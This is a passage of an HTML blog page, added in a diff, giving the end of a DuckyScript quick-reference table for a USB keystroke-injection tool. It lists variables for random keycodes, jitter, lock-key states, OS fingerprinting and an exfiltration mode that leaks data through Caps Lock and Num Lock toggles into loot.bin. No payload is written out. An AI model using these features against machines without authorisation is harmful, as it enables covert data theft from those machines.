+<td><code>$_RANDOM_UPPER_LETTER_KEYCODE</code></td>
+<td>Returns random upper letter scancode (A-Z)</td>
+</tr>
+<tr>
+<td><code>$_RANDOM_LETTER_KEYCODE</code></td>
+<td>Returns random letter scancode (a-zA-Z)</td>
+</tr>
+<tr>
+<td><code>$_RANDOM_NUMBER_KEYCODE</code></td>
+<td>Returns random number scancode (0-9)</td>
+</tr>
+<tr>
+<td><code>$_RANDOM_SPECIAL_KEYCODE</code></td>
+<td>Returns random special char scancode (shift+0-9)</td>
+</tr>
+<tr>
+<td><code>$_RANDOM_CHAR_KEYCODE</code></td>
+<td>Returns random letter number or special scancode</td>
+</tr>
+<tr>
+<td><strong>JITTER</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>$_JITTER_ENABLED</code></td>
+<td>Set <code>TRUE</code> to enable jitter. Default <code>FALSE</code>.</td>
+</tr>
+<tr>
+<td><code>$_JITTER_MAX</code></td>
+<td>Sets the maximum time between key presses in milliseconds. The default maximum is 20 ms.</td>
+</tr>
+<tr>
+<td><strong>LOCK KEYS</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>$_CAPSLOCK_ON</code></td>
+<td><code>TRUE</code> if on, <code>FALSE</code> if off.</td>
+</tr>
+<tr>
+<td><code>$_NUMLOCK_ON</code></td>
+<td><code>TRUE</code> if on, <code>FALSE</code> if off.</td>
+</tr>
+<tr>
+<td><code>$_SCROLLLOCK_ON</code></td>
+<td><code>TRUE</code> if on, <code>FALSE</code> if off.</td>
+</tr>
+<tr>
+<td><code>$_SAVED_CAPSLOCK_ON</code></td>
+<td>On USB attach or <code>SAVE_HOST_KEYBOARD_LOCK_STATE</code>, sets <code>TRUE</code> or <code>FALSE</code> depending on the reported OS condition.</td>
+</tr>
+<tr>
+<td><code>$_SAVED_NUMLOCK_ON</code></td>
+<td>On USB attach or <code>SAVE_HOST_KEYBOARD_LOCK_STATE</code>, sets <code>TRUE</code> or <code>FALSE</code> depending on the reported OS condition.</td>
+</tr>
+<tr>
+<td><code>$_SAVED_SCROLLLOCK_ON</code></td>
+<td>On USB attach or <code>SAVE_HOST_KEYBOARD_LOCK_STATE</code>, sets <code>TRUE</code> or <code>FALSE</code> depending on the reported OS condition.</td>
+</tr>
+<tr>
+<td><code>$_RECEIVED_HOST_LOCK_LED_REPLY</code></td>
+<td>On receipt of any lock state LED control code, sets <code>TRUE</code>. This flag is helpful for fingerprinting certain operating systems (e.g. macOS) or systems which do not reflect lock keys.</td>
+</tr>
+<tr>
+<td><strong>STORAGE</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>$_STORAGE_ACTIVITY_TIMEOUT</code></td>
+<td>As payload is running, this value decrements if storage activity is not detected. Default value is 1000.</td>
+</tr>
+<tr>
+<td><strong>EXFILTRATION</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>$_EXFIL_MODE_ENABLED</code></td>
+<td>Default <code>FALSE</code>. Set <code>TRUE</code> to enable Keystroke Reflection. Will listen for <code>CAPSLOCK</code> and <code>NUMLOCK</code> changes, writing binary values to loot.bin. num=1, caps=0.</td>
+</tr>
+<tr>
+<td><strong>OS_DETECT</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>$_HOST_CONFIGURATION_REQUEST_COUNT</code></td>
+<td>Used by <code>OS_DETECT</code> <code>EXTENSION</code> to detect device enumeration count.</td>
+</tr>
+<tr>
+<td><code>$_OS</code></td>
+<td>Used by <code>OS_DETECT</code> <code>EXTENSION</code> to return value of fingerprinted operating system. May return <code>WINDOWS</code>, <code>MACOS</code>, <code>LINUX</code>, <code>CHROMEOS</code>, <code>ANDROID</code>, <code>IOS</code>. These names are reserved and should not be used in user variables.</td>
+</tr>
+</tbody></table>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%B5%8C%E5%85%A5%E5%BC%8F/" class="category-chain-item">嵌入式</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%B5%8C%E5%85%A5%E5%BC%8F/" class="print-no-link">#嵌入式</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>DuckyScript脚本</div>
+      <div>https://blog.zhaosn.top/DuckyScriptQuickReference/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zhao SN</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年3月19日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2026年3月19日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-cc-nc"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                    <i class="iconfont icon-cc-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/OpenclawMemMachine/" title="Openclaw接入MemMachine流程">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Openclaw接入MemMachine流程</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/tips/JSPI/" title="JSPI刷BIOS">
+                        <span class="hidden-mobile">JSPI刷BIOS</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start -->
+  <script src="/js/outdated.js"></script>
+<!-- hexo injector body_end end --></body>
+</html>
